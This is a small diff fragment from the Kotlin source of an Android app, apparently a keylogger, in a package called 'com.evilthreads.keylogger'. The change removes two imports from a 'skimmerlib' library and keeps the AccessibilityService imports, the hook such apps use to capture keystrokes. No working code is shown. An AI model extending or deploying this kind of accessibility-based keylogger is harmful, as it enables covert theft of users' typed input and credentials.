@@ -2,8 +2,6 @@ package com.evilthreads.keylogger
 
 import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityEvent
-import com.evilthreads.skimmerlib.Keylogger
-import com.evilthreads.skimmerlib.KeyloggerEntry
 import kotlinx.coroutines.runBlocking
 /*
             (   (                ) (             (     (
